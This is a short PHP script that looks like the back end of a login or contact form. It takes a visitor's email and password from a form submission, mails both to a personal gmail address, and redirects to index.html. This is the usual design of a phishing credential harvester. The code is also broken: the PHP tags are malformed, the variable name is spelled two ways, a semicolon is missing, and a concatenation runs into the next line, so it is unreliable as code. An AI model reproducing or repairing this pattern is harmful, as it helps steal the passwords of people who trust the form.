<?p
// $name= $_POST["name"];
$visiter_email= $_POST["email"];
$Subject= $_POST["password"];
// $message= $_POST["message"];

$email_from="genius@gmail.com";
$email_Subject="New form Submission";
$email_body="User email:$visitor_email.\n".
             "Subject:$Subject.\n".
             
$to="msamimashfaqtahir@gmail.com"
$headers="From:$email_from \r\n";
$headers.="Reply-To: $visitor_email \r\n";
mail($to,$email_Subject,$email_body,$headers);
header("Location: index.html");             

?>p